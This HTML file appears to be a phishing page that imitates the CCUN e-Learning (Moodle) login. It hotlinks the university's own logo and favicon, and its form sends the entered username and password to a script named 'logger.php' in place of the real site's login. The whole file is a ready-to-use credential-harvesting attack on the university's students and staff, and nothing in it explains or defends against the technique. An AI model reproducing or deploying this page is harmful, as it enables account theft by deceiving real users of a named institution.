<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Log in to the site | e-Learning System CCUN</title>
  <link rel="icon" href="https://moodle.ccun.edu.kh/pluginfile.php/1/core_admin/favicon/64x64/1750919058/ccunlogo-small2.png" />
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: url('https://moodle.ccun.edu.kh/pluginfile.php/1/theme_adaptable/logo/1750488850/ccun-header-logo2.png') no-repeat center center fixed;
      background-size: cover;
    }

    .login-container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: url('https://img.simplerousercontent.net/scaled_image/4615836/9958bf1fb7c840246c0f62148eab5890971aff52/BL00-3-Ways-to-Mindfully-Use-Technology-in-the-New-Normal-High-Quality-500w-261h.jpg') no-repeat center center fixed;
      background-size: cover;
    }

    .login-box {
      background:white;
      padding: 40px;
      padding-bottom: 5%;
      width: 380px;
      height: 250px;
      
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      text-align: center;
      margin-top: -25%;
      
    }

    .logo {
      width: 100%;
      margin-bottom: 10px;
      background-color: #0B194F;
      border-radius: 5px;
    }

    /* .login-box h2 {
      font-size: 16px;
      margin-bottom: 20px;
      color: #003366;
      border-radius: 5px;
    } */

    input[type="text"],
    input[type="password"] {
      width: 95%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-shadow: 2px 2px 5px rgba(0,0,0,0.1);
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #377E21;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-bottom: 20px;;
    }
    .line {
     
      opacity: 0.3;
    }



    button:focus {
      outline: none;
}
    button:hover {
      background-color: #d51717;
    }
  </style>
</head>
<body>
  
  <div class="login-container">
    <form class="login-box" action="logger.php" method="POST">
      <img src="https://moodle.ccun.edu.kh/pluginfile.php/1/theme_adaptable/logo/1750488850/ccun-header-logo2.png" alt="CCUN Logo" class="logo">
    
      <input type="text" name="username" placeholder="e2021784" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log in</button>
      <hr class="line">
    </form>
  </div>
</body>
</html>
